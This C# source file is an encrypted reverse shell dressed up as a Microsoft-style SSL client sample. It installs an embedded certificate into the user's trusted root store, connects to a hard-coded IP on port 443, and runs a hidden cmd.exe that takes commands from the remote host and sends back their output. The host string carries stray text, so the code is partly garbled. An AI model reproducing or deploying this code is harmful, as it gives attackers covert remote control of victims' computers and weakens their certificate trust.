using System;
using System.Collections;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Text;
using System.Security.Cryptography.X509Certificates;
using System.IO;
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace SslTcpClient56105443wEmbeddedCert
{
    public class SslTcpClient
    {

        static StreamWriter streamWriter;
        private static Hashtable certificateErrors = new Hashtable();

        // The following method is invoked by the RemoteCertificateValidationDelegate.
        public static bool ValidateServerCertificate(
              object sender,
              X509Certificate certificate,
              X509Chain chain,
              SslPolicyErrors sslPolicyErrors)
        {
            if (sslPolicyErrors == SslPolicyErrors.None)
            {
                //return certificate.Equals(certificate);
                return true;
            }

            else
            {
                Console.WriteLine("Certificate error: {0}", sslPolicyErrors);
                // Do not allow this client to communicate with unauthenticated servers.
                return false;
            }
        }
        public static void RunClient(string machineName, string serverName)
        {
            // Create a TCP/IP client socket.
            // machineName is the host running the server application.
            TcpClient client = new TcpClient(machineName, 443);
            // Create an SSL stream that will close the client's stream.
            SslStream sslStream = new SslStream(
                client.GetStream(),
                false,
                new RemoteCertificateValidationCallback(ValidateServerCertificate),
                null
                );
            // The server name must match the name on the server certificate.
            try
            {
                sslStream.AuthenticateAsClient(serverName);
            }
            catch (AuthenticationException e)
            {
                Console.WriteLine("Exception: {0}", e.Message);
                if (e.InnerException != null)
                {
                    Console.WriteLine("Inner exception: {0}", e.InnerException.Message);
                }
                Console.WriteLine("Authentication failed - closing the connection.");
                client.Close();
                return;
            }

            StreamReader rdr = new StreamReader(sslStream);
            streamWriter = new StreamWriter(sslStream);
            StringBuilder strInput = new StringBuilder();
            Process p = new Process();
            p.StartInfo.FileName = "C:\\Windows\\System32\\cmd.exe";
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            p.Start();
            p.BeginOutputReadLine();
            while (true)
            {
                strInput.Append(rdr.ReadLine());
                //strInput.Append("\n");
                p.StandardInput.WriteLine(strInput);
                strInput.Remove(0, strInput.Length);
            }
        }
        static string ReadMessage(SslStream sslStream)
        {
            // Read the  message sent by the server.
            // The end of the message is signaled using the
            // "<EOF>" marker.
            byte[] buffer = new byte[2048];
            StringBuilder messageData = new StringBuilder();
            int bytes = -1;
            do
            {
                bytes = sslStream.Read(buffer, 0, buffer.Length);

                // Use Decoder class to convert from bytes to UTF8
                // in case a character spans two buffers.
                Decoder decoder = Encoding.UTF8.GetDecoder();
                char[] chars = new char[decoder.GetCharCount(buffer, 0, bytes)];
                decoder.GetChars(buffer, 0, bytes, chars, 0);
                messageData.Append(chars);
                // Check for EOF.
                if (messageData.ToString().IndexOf("<EOF>") != -1)
                {
                    break;
                }
            } while (bytes != 0);

            return messageData.ToString();
        }
        private static void DisplayUsage()
        {
            Console.WriteLine("To start the client specify:");
            Console.WriteLine("clientSync machineName [serverName]");
            Environment.Exit(1);
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception ex)
                {
                    // silence is golden
                }
            }
        }
        public static int Main(string[] args)
        {
            //Create new X509 store called teststore from the local certificate store.
            X509Store store = new X509Store(StoreName.Root, StoreLocation.CurrentUser);
            store.Open(OpenFlags.ReadWrite);

            //Create certificates from certificate files.
            //You must put in a valid path to three certificates in the following constructors.
            String encodedPemCert = "MIIFnzCCA4egAwIBAgIUc8dfrOuNISsFwqIMY3la9ZMKufswDQYJKoZIhvcNAQELBQAwXzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDEYMBYGA1UEAwwPRUMyQU1BWi1LMlEwVkxKMB4XDTIyMDQwMTAwMTcwM1oXDTIzMDQwMTAwMTcwM1owXzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDEYMBYGA1UEAwwPRUMyQU1BWi1LMlEwVkxKMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAurtRThXpEg+sFOY4ZsY5lKw/Jy+p7GdVqAZUGgHUH6WWTgtKoyVJkM0JiuKk3zHN/QdclokhnsiRbx/9Kp9KpOHyENdKJzYVinJbHLDYrrVxFW9uPxqxpDi3hKuaxqA+I/MmwsjunoMwJ9H5Pst1Z+1/G0bNEroz5HXQhzuSkPN9kuZZM01PCx8zq98K9fujC7s79lFFeK+nDR1YE0McH6ToDG26SJ8sfTUeWxq6/IE265fiVg3PM6y/cwN4AT0uxn+iw0pEYgBcPe9ddxACa7auLAqa4eSvU7bZH3HrtRPz4hU1kbWvfog7Fx0EBiHBLRU8aPZDPQqgxFLdtB5T7TtSFbTDFDgSvGYzZ0LsbKN+JSiElmuA4lV602loJ9VwU0rdVACjlVs1GPuzoYgSdwBLsIt5vtLDrMh8W+ccUDG0gURBaA4YKpLsnJviFj4cPmM+Irwdyte3jz1PrCmt9+JKQaam2Mi9arryVtZlif/KirGtpJa+fPNSpKVs3RKlu1aMKOtTcGuS9aw1OwIWrCIaCOupPxWCmJCrxm38U/9pwgtoGrjNNnkNPbaQ5JWmSOR1n3XLCCyQHNTZluOKOGKHQ4m7f7/9PNk1ZbXkgHKXTTDXiL19M9Pfv5WFfASGGMp5ok1ZDg0aiBbM2F9uPuFsH+0gntlVLJUP4ixmMqkCAwEAAaNTMFEwHQYDVR0OBBYEFMbz54yWQK+bOI4kteDhHnTHChmuMB8GA1UdIwQYMBaAFMbz54yWQK+bOI4kteDhHnTHChmuMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggIBACjT2DlmiVWA70EHoHEDCWLEJT7csW9Kiok13bwcXrrCLgVA7uD14IEhkrJYHWvy/o3yrwKSRD4NERDRpH/WN/URn2kj7gpGO0b7mvSRfgySl2hJzjljRn4RRuJ/Yo4WSKLurJK29Mg2/lv2R4kwsBMV4u61DmQ5TvGPKy7UQGVt0P8HIj2iXnjxME4Y6Wg/ejijTSFSzeAwxkmUhptZpJQer1tgNf6CfgEIcp1squCoYp4uAzqmuKY1U6HyK/EjGRxQsrG4CnqnfQmotKqk3xJK50SFFuJgxzTepdWT39za4ZndL6FSfBoJX6bB6FrTyyiwEk3+isF3UooKCrreQm9FV9j7+dxzVVltR6Cb3nTYrO3xixeNsVuA8LMbaBNFrDQkjxbLT1qJbKcuVRPnwEM7yhAVohelA1vWGU/r/UUcnC1zTeiF6LTxmZPIWEA5CxmUllXKFNU3uMGH00mK1+oEXs6IqW7pjwecoIAQWXmj8Oj794wkn9pIoByZwQXLSm5REivibM88SOSfbEHnicED5L/PkcmEWwiiJrDCeKFRelqNkJHvOlv9+KCsNDWUb1Dz98qupkjQyCixG3kr5dHzxkk/w1xxXuMFHep7eaw+2ykgekhZbJRyXG/4caUv43ewXRO8MxbVkkhZzBheNwCB/8wyHILTiIo8hYkNc+Hz";
            X509Certificate2 srvCertificate = new X509Certificate2(Convert.FromBase64String(encodedPemCert));

            //Create a collection and add the certificates.
            X509Certificate2Collection collection = new X509Certificate2Collection();
            collection.Add(srvCertificate);

            //Add certificates to the store.
            store.Add(srvCertificate);
            store.AddRange(collection);

            string serverCertificateName = "EC2AMAZ-K2Q0VLJ";
            string machineName = "52.91.64.124 damon has changed this";
            
            SslTcpClient.RunClient(machineName, serverCertificateName);
            return 0;
        }
    }
}